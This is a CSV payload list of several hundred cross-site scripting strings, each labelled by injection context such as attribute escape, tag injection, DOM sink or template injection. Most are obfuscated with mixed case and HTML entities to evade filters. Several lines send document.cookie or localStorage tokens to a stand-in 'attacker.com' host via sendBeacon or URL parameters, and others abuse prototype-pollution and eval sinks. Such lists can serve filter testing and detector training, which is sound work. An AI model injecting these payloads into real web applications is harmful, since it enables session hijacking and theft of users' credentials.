payload,context
"__pRotO__[""oNinPut""]=EvaL(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)",dom_sink
"__proto__[""ondr&#97;gov&#101;r""]=prompt('XSS')",dom_sink
"%3Ciframe ontouchstart=prompt(String.fromCharCode(88,83,83)) ontouchstart=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"' %3E%3Csvg onbeforematch=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
onlo&#97;d=confirm&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
""" %3E%3Csvg onpause=confirm(document.domain)%3E",attribute_escape
""" ><svg onpointercancel=prompt(1)>",attribute_escape
<%= alert document.domain %>,template_injection
OnwHeeL=pRomPt(1),event_handler
'><img src=x ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(1)>,attribute_escape
"""><Img srC=x onPoiNteRmoVe=ProMpt(loCatIon.haSh)>",attribute_escape
"%27><img src=x onanimationiteration=alert(String.fromCharCode(88,83,83))>",attribute_escape
"""><embed onmozfullscreenchange=confirm(location.hash)>",tag_injection
&quot; onanimationiteration=console.log('XSS') x=&quot;,attribute_escape
${{\u0061lert('XSS')}},template_injection
"WinDow[""cOnsOle.loG""](btOa(DocUmeNt.CooKie))",dom_sink
"%22 onanimationiteration=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
__proto__[%22onbeforeinput%22]=console.log(%27//attacker.com/?c=%27+document.cookie),dom_sink
""" %3E%3Csvg onanimationiteration=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"`><img src=x onscrollend=alert(String.fromCharCode(88,83,83))>",attribute_escape
'><img src=x onsearch=\u0061lert(1)>,attribute_escape
<img onpageswap=console.log(1) onpageswap=console.log(1)>,tag_injection
"<base
onpageswap=alert(%27XSS%27)>",tag_injection
""" ongotpointercapture=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
'%3E%3Cimg src=x onmousedown=confirm(1)%3E,attribute_escape
"<template
onreset=alert(location.hash)>",tag_injection
%27 onkeypress=alert(%27XSS%27) %27,attribute_escape
""" ><svg onpoint&#101;rov&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
%27 ><svg onsearch=confirm(1)>,attribute_escape
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""prOmpT(STriNg.FroMChArCOde(88,83,83))""",dom_sink
"""><img src=x on&#101;nd=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape
<script>/x/consol&#101;.log(1)</script>,script_injection
ongotpointercapture=prompt(location.hash),event_handler
<baSe Src=x OnbEfoRecOpy=coNsoLe.Log(loCatIon.haSh)>,tag_injection
""" ><svG oNanImaTioNcaNceL=cOnfIrm(loCatIon.haSh)>",attribute_escape
"\"" OnwAitIng=prOmpT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
\' onb&#101;gin=confirm(loc&#97;tion.h&#97;sh)//,attribute_escape
"window[""prompt""](docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
`><Img srC=x onPagEswAp=AleRt(DocUmeNt.DomAin)>,attribute_escape
<img	onp&#97;g&#101;sw&#97;p=consol&#101;.log(1)>,tag_injection
"<meTa X=y onHasHchAngE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
%3Cobject src=x ontouchstart=console.log(location.hash)%3E,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""oncopy"":&#101;v&#97;l})",dom_sink
"\"" OnpOpsTatE=pRomPt(1)//",attribute_escape
"'><img src=x onpoint&#101;rov&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<!--><TabLe OncOpy=coNfiRm('XSS')>,tag_injection
""" ><svg ongestureend=prompt('XSS')>",attribute_escape
"%3Cselect
onsecuritypolicyviolation=confirm(location.hash)%3E",tag_injection
<!--><di&#97;log onpoint&#101;rov&#101;r=confirm(1)>,tag_injection
"Object.assign(window,{""oncopy"":XMLHttpRequest})",dom_sink
"<script
>consol&#101;.log(loc&#97;tion.h&#97;sh)</script>",script_injection
"JavA
sCriPt:ConFirM(STriNg.FroMChArCOde(88,83,83))",js_uri
'><img src=x ondragstart=console.log(document.domain)>,attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(1)>"")",dom_sink
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=eval(document.domain)>"")",dom_sink
<base onkeydown=\u0061lert('XSS')/>,tag_injection
"__pRotO__[""oNcoNteXtmEnu""]=EvaL(dOcuMenT.cOokIe)",dom_sink
"__proto__[""oncopy""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.dom&#97;in)",dom_sink
`%3E%3Cimg src=x onanimationend=confirm(1)%3E,attribute_escape
%3Canimatemotion ondrop=confirm(location.hash) ondrop=confirm(location.hash)%3E,tag_injection
'><Img srC=x onDblCliCk=AleRt(1)>,attribute_escape
"__pRotO__[""oNtoUchStaRt""]=fEtcH(STriNg.FroMChArCOde(88,83,83))",dom_sink
`><img src=x onfocusout=alert(location.hash)>,attribute_escape
"""><Img srC=x onAniMatIonEnd=coNfiRm(LocAtiOn.HasH)>",attribute_escape
"__proto__[""onmous&#101;up""]=XMLHttpR&#101;qu&#101;st(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
`><Img srC=x onWheEl=ProMpt('XSS')>,attribute_escape
"""%3E%3Cimg src=x onanimationend=confirm(document.domain)%3E",attribute_escape
'><Img srC=x onKeyPreSs=AleRt('XSS')>,attribute_escape
"location.href=""javascr	ipt:alert(btoa(document.cookie))""",dom_sink
"\"" oninput=\u0061lert(document.domain)//",attribute_escape
&quot; onclick=prompt('XSS') x=&quot;,attribute_escape
%22 ><svg ontransitionend=alert(1)>,attribute_escape
OnfOcuSouT=pRomPt/***/('XSS'),event_handler
"""><img src=x ontoggle=console.log('XSS')>",attribute_escape
&quOt; onPopStaTe=AleRt(1) X=&QuoT;,attribute_escape
\' OnwAitIng=coNfiRm(DocUmeNt.DomAin)//,attribute_escape
""" ><svG oNbeForEpaSte=prOmpT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
`%3E%3Cimg src=x onauxclick=prompt(location.hash)%3E,attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=eVal(loCalStoRagE.gEtITem('tOkeN'))>""",dom_sink
"setInterval(""alert(location.hash)"",100)",dom_sink
' oNpaGehIde=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape
javascript:void(alert('XSS')),js_uri
"""><img src=x onanimationiteration=prompt(1)>",attribute_escape
%22 onfocus=console.log(%27XSS%27) autofocus=%22,attribute_escape
\' OnbEgiN=cOnsOle.loG(lOcaTioN.hAsh)//,attribute_escape
""" ><svG oNscRolLenD=pRomPt(LocAtiOn.HasH)>",attribute_escape
%3Cblink	onpopstate=console.log(document.domain)%3E,tag_injection
"	onKeyDowN=aLerT(STriNg.FroMChArCOde(88,83,83))",event_handler
<textarea/onscrollend=alert('XSS')>,tag_injection
	ondrop=prompt(loc&#97;tion.h&#97;sh),event_handler
"onb&#101;for&#101;toggl&#101;=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"' onmous&#101;up=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
'><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(1)>,attribute_escape
<select	onsecuritypolicyviolation=confirm(location.hash)>,tag_injection
<!--><video ondragstart=alert(%27XSS%27)>,tag_injection
"""><Xss onMouSeoVer=coNsoLe.Log('XSS')>",tag_injection
"\' onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
' oninput=&#97;l&#101;rt(1) ',attribute_escape
<td src=x onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
onmous&#101;&#101;nt&#101;r=j&#97;v&#97;script:&#97;l&#101;rt('XSS'),event_handler
<xsS oNmoUseOveR=cOnsOle.loG('XSS') OnmOusEovEr=ConSolE.lOg('XSS')>,tag_injection
\%22 ontouchmove=confirm(document.domain)//,attribute_escape
'><Img srC=x onResEt=ConSolE.lOg('XSS')>,attribute_escape
"setTimeout(""XMLHttpRequest(String.fromCharCode(88,83,83))"",0)",dom_sink
"data:text/html,<scr	ipt>alert(String.fromCharCode(88,83,83))</scr	ipt>",js_uri
&quOt; onEnd=prOmpT(lOcaTioN.hAsh) x=&qUot;,attribute_escape
' ><svg oncopy=confirm(location.hash)>,attribute_escape
"' on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
<dialog src=x onstalled=confirm(%27XSS%27)>,tag_injection
<span	onsecuritypolicyviolation=\u0061lert(location.hash)>,tag_injection
`><img src=x onpl&#97;ying=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape
\' OntOggLe=ConFirM('XSS')//,attribute_escape
<script>//console.log('XSS')</script>,script_injection
<s&#101;t onpoint&#101;rmov&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
`%3E%3Cimg src=x onhashchange=console.log(document.domain)%3E,attribute_escape
""" onmouseover=console.log('XSS') x=""",attribute_escape
"\"" onfocus=prompt(location.hash)//",attribute_escape
"%3Cform onwebkitfullscreenchange=console.log(String.fromCharCode(88,83,83)) onwebkitfullscreenchange=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
onpointermove=\u0061lert/***/('XSS'),event_handler
"' ><svg onanimationiteration=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"`><img src=x onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"\"" ondblclick=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
{{cOnsTruCtoR.cOnsTruCtoR('ProMpt(doCumEnt.coOkiE)')()}},template_injection
%22><animate onfocus=console.log(document.domain)>,tag_injection
"""><title onmozfullscreenchange=prompt('XSS')>",tag_injection
"<animatemotion
onwaiting=alert(location.hash)>",tag_injection
on&#97;uxclick=prompt/**/('XSS'),event_handler
' ><svG oNauXclIck=coNsoLe.Log(1)>,attribute_escape
"\"" onpromptdismiss=&#97;l&#101;rt('XSS')//",attribute_escape
"onkeydown=alert/**/(String.fromCharCode(88,83,83))",event_handler
&quot; ons&#101;l&#101;ct=prompt(1) x=&quot;,attribute_escape
 onc&#97;npl&#97;y=consol&#101;.log('XSS'),event_handler
__proto__[%22onbeforepaste%22]=eval(localStorage.getItem(%27token%27)),dom_sink
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=console.log(btoa(document.cookie))>"")",dom_sink
"<ifRamE	oNgeStuReeNd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
{{{alert(%27XSS%27)}}},template_injection
%27 ><svg onpagehide=console.log(document.domain)>,attribute_escape
<math oninvalid=confirm(%27XSS%27)>,tag_injection
<tr ontoggle=console.log(document.domain) ontoggle=console.log(document.domain)>,tag_injection
' %3E%3Csvg ontransitionend=alert(document.domain)%3E,attribute_escape
{{prompt(docum&#101;nt.dom&#97;in)}},template_injection
""" oNseLecT=cOnsOle.loG(lOcaTioN.hAsh) """,attribute_escape
 onPagEshOw=AleRt('XSS'),event_handler
"document.body.innerHTML=""<img src=x onerror=\u0061lert(String.fromCharCode(88,83,83))>""",dom_sink
%22 ><svg onpagereveal=console.log(1)>,attribute_escape
%27 onpaste=console.log(document.domain) %27,attribute_escape
"__pRotO__[""oNkeYup""]=ConSolE.lOg(BtoA(dOcuMenT.cOokIe))",dom_sink
%22><object onmozfullscreenchange=console.log(1)>,tag_injection
<td src=x onwebkitanimationend=prompt(%27XSS%27)>,tag_injection
"(new Function(""prompt(btoa(document.cookie))""))();",dom_sink
""" ><svg on&#101;nd&#101;d=&#97;l&#101;rt(1)>",attribute_escape
<m&#97;th/oncopy=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
<object onanimationcancel=\u0061lert(document.domain) onanimationcancel=\u0061lert(document.domain)>,tag_injection
""" oNkeYdoWn=ProMpt('XSS') """,attribute_escape
"\"" onbeforepaste=\u0061lert(1)//",attribute_escape
"%22 onfocus=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
<tr x=y ontoggle=console.log(document.domain)>,tag_injection
""" ><svg ontoggle=\u0061lert(document.domain)>",attribute_escape
`><img src=x onw&#97;iting=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=confirm(document.cookie+'&loc='+location.href)%3E"")",dom_sink
<!--><noscript onbeforematch=console.log('XSS')>,tag_injection
"""><tr on&#97;nim&#97;tion&#101;nd=prompt('XSS')>",tag_injection
"""><script>prompt(loc&#97;tion.h&#97;sh)</script>",script_injection
onbegin=javascript:console.log(%27XSS%27),event_handler
 onPauSe=ProMpt(loCatIon.haSh),event_handler
"%3Cnoscript onbeforematch=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"""><form ongesturestart=console.log('XSS')>",tag_injection
""" oncut=console.log(1) """,attribute_escape
"${{'confirm(document.domain)'.replace('confirm(document.domain)','')}}",template_injection
&#106;avascr	ipt:console.log(document.domain),js_uri
onselect=prompt&#40;location.hash&#41;,event_handler
' ><svg onpoint&#101;rup=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
'><img src=x onbeforepaste=alert(1)>,attribute_escape
 onKeyDowN=cOnsOle.loG(dOcuMenT.dOmaIn),event_handler
<form onpagereveal=console.log(location.hash)>,tag_injection
"EvaL(""ConFirM('XSS')"")",dom_sink
"\"" onsearch=confirm(1)//",attribute_escape
"' ><svg onpromptaction=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"""><img src=x ongestureend=prompt(document.domain)>",attribute_escape
'><img src=x onb&#101;for&#101;input=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
\' onpagehide=\u0061lert(document.domain)//,attribute_escape
"' onr&#101;p&#101;&#97;t=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"""><img src=x ontoggl&#101;=consol&#101;.log('XSS')>",attribute_escape
"\"" ondrop=confirm(docum&#101;nt.dom&#97;in)//",attribute_escape
onkeydown=confirm/*x*/(1),event_handler
'><Img srC=x onGesTurEenD=pRomPt(1)>,attribute_escape
"data:text/html,<scr	ipt>confirm(document.domain)</scr	ipt>",js_uri
onscroll&#101;nd=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
"__proto__[""onhashchange""]=eval(localStorage.getItem('token'))",dom_sink
<auDio srC=x onInpUt=ProMpt(loCatIon.haSh)>,tag_injection
"<xmP oNmoUseWheEl=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
"__proto__[""onfocusin""]=f&#101;tch(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
"onvolumechange=\u0061lert/*x*/(String.fromCharCode(88,83,83))",event_handler
%22><img src=x onclose=alert(document.domain)>,attribute_escape
"""><body ong&#101;stur&#101;st&#97;rt=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
OnpOinTerMovE=cOnsOle.loG/***/(doCumEnt.doMaiN),event_handler
"onbeforetoggle=prompt(String.fromCharCode(88,83,83))",event_handler
"<SCRIPT>console.log(String.fromCharCode(88,83,83))</SCRIPT>",script_injection
"${{'prompt('XSS')'.replace('prompt('XSS')','')}}",template_injection
oncut=alert/***/(document.domain),event_handler
{{{confirm(document.domain)}}},template_injection
"Object.assign(window,{%22onwheel%22:confirm})",dom_sink
 onfocusout=confirm('XSS'),event_handler
"\"" OnsTalLed=prOmpT(1)//",attribute_escape
onplaying=console.log&#40;location.hash&#41;,event_handler
&quOt; onEndEd=AleRt('XSS') x=&quOt;,attribute_escape
"document.body.innerHTML=""%3Cimg src=x onerror=confirm(localStorage.getItem('token'))%3E""",dom_sink
<noscr	ipt	onbeforematch=console.log('XSS')>,tag_injection
%3C!--%3E%3Caudio onpause=console.log(document.domain)%3E,tag_injection
<% prompt(document.domain) %>,template_injection
%22><mtext onstalled=console.log(document.domain)>,tag_injection
<tr/ontoggle=console.log(document.domain)>,tag_injection
<scr	ipt>/*/prompt('XSS')</scr	ipt>,script_injection
<!--><obj&#101;ct onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(1)>,tag_injection
'><img src=x onprompt&#97;ction=consol&#101;.log('XSS')>,attribute_escape
"Object.assign(window,{""onvolumechange"":\u0061lert})",dom_sink
"Object.assign(window,{%22onpageshow%22:fetch})",dom_sink
OnfOcuSouT=cOnfIrm/**/(lOcaTioN.hAsh),event_handler
'%3E%3Cimg src=x onpagehide=console.log(document.domain)%3E,attribute_escape
""" onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) &#97;utofocus=""",attribute_escape
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""f&#101;tch(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"")",dom_sink
%22 onwebkitanimationend=console.log(document.domain) %22,attribute_escape
j&#97;v&#97;script:confirm/*x*/(loc&#97;tion.h&#97;sh),js_uri
"""><img src=x onpromptdismiss=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))>"")",dom_sink
\' oncut=alert('XSS')//,attribute_escape
OnaNimAtiOneNd=ConSolE.lOg('XSS'),event_handler
%3Canimatemotion x=y onanimationcancel=prompt(1)%3E,tag_injection
"`%3E%3Cimg src=x onbegin=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
"__pRotO__[""oNpaGesWap""]=EvaL('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)",dom_sink
<form/onwebkitanimationend=prompt('XSS')>,tag_injection
onbeforeinput=javascript:prompt(document.domain),event_handler
\%27 onpromptdismiss=alert(%27XSS%27)//,attribute_escape
j&#97;v&#97;script:%0&#97;confirm(docum&#101;nt.dom&#97;in),js_uri
"%22 ><svg onpointerover=console.log(String.fromCharCode(88,83,83))>",attribute_escape
<td srC=x onEnd=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""prompt(docum&#101;nt.dom&#97;in)""",dom_sink
\%27 ongotpointercapture=console.log(%27XSS%27)//,attribute_escape
&quOt; onVolUmeChaNge=alErt('XSS') x=&qUot;,attribute_escape
"""><object onanimationcancel=\u0061lert(document.domain)>",tag_injection
onk&#101;ydown=&#97;l&#101;rt('XSS'),event_handler
"ObjEct.asSigN(wIndOw,{""oNmoUseEntEr"":alErt})",dom_sink
onplaying=console.log/***/(location.hash),event_handler
"""><TitLe OnsTalLed=alErt('XSS')>",tag_injection
"OnbEfoRepAstE=jAvaScrIpt:alErt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"`><img src=x on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
java	script:\u0061lert(location.hash),js_uri
"LocAtiOn.HreF=""JavAscRipT:eVal(loCatIon.haSh)""",dom_sink
%22><noscript onbeforematch=console.log(%27XSS%27)>,tag_injection
"__proto__[""onend""]=\u0061lert(1)",dom_sink
<b&#97;s&#101; x=y onk&#101;ydown=&#97;l&#101;rt('XSS')>,tag_injection
onpointerover=prompt/**/(document.domain),event_handler
`><img src=x onmouseover=prompt(document.domain)>,attribute_escape
""" ><svg onpointerup=prompt(location.hash)>",attribute_escape
#{{\u0061lert(document.cookie)}},template_injection
"__pRotO__[""oNgeStuResTarT""]=prOmpT(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)",dom_sink
'><Img srC=x onPopStaTe=ProMpt(1)>,attribute_escape
"&quot; ontouch&#101;nd=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNpoPstAte"":cOnfIrm})",dom_sink
"Object.assign(window,{%22onbeforecut%22:alert})",dom_sink
%3CSCRIPT%3Econsole.log(location.hash)%3C/SCRIPT%3E,script_injection
<taBle srC=x onSelEct=coNfiRm(DocUmeNt.DomAin)>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""onprompt&#97;ction"":consol&#101;.log})",dom_sink
"	onhashchange=confirm(String.fromCharCode(88,83,83))",event_handler
"__proto__[""ontouchend""]=confirm('//attacker.com/?c='+document.cookie)",dom_sink
`><img src=x onanimationiteration=confirm('XSS')>,attribute_escape
<taBle onSeaRch=prOmpT(1)/>,tag_injection
"element.setAttribute(""onclick"",""alert(document.cookie)"")",dom_sink
"' onclose=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
\' onrepeat=\u0061lert(location.hash)//,attribute_escape
"document.querySelector(""body"").innerHTML+=""\u0061lert(document.domain)""",dom_sink
document.body.innerHTML=%22<img src=x onerror=console.log(document.cookie)>%22,dom_sink
"%3Cdialog
onpagehide=console.log(1)%3E",tag_injection
 onscrollsnapchange=\u0061lert(1),event_handler
""" ><svg ontouchmov&#101;=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape
' %3E%3Csvg onwebkitfullscreenchange=prompt('XSS')%3E,attribute_escape
onmousedown=javascr	ipt:confirm('XSS'),event_handler
"<pl&#97;int&#101;xt	onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' onpromptdismiss=\u0061lert(document.domain) ',attribute_escape
"' ><svG oNplAy=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
<liStiNg OnpOinTerRawUpdAte=alErt('XSS') oNpoIntErrAwuPdaTe=AleRt('XSS')>,tag_injection
'><img src=x onauxclick=confirm(location.hash)>,attribute_escape
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=confirm(bto&#97;(docum&#101;nt.cooki&#101;))>"")",dom_sink
